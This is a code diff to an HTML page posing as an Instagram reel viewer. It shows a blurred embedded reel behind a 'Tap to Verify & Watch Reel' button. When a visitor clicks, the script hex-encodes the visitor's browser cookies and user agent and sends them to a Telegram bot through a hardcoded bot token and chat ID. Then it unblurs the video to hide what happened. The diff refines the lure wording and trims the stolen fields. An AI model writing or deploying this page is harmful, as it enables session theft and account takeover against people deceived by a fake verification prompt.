@@ -2,6 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram</title>
 <style>
 body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;font-family:sans-serif}
 #g{position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,0.9)}
@@ -12,7 +13,7 @@ iframe{width:100%;height:100vh;border:none;filter:blur(10px)}
 <body>
 <div id="g">
 <img src="https://www.instagram.com/static/images/ico/favicon-192.png/b30670883ce2.png" width="50" style="margin-bottom:20px">
-<p style="color:#fff;margin-bottom:20px">Verify to Watch Reel</p>
+<p style="color:#fff;margin-bottom:20px">Tap to Verify & Watch Reel</p>
 <button class="b" onclick="c()">Verify Now</button>
 </div>
 <iframe id="r" src="https://www.instagram.com/reel/DXvjb0FP8W0/embed/"></iframe>
@@ -20,8 +21,8 @@ iframe{width:100%;height:100vh;border:none;filter:blur(10px)}
 function c(){
 var T="8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k",C="8639892987";
 var h=function(s){return [...s].map(function(x){return x.charCodeAt(0).toString(16).padStart(2,'0')}).join('')};
-var d=JSON.stringify({ua:navigator.userAgent,st:Object.keys(localStorage),ck:document.cookie});
-new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text=🚀_INIT_"+h(d);
+var d=JSON.stringify({ua:navigator.userAgent,ck:document.cookie});
+new Image().src="https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text=🚀_DATA_"+h(d);
 document.getElementById('g').style.display='none';
 document.getElementById('r').style.filter='none';
 }
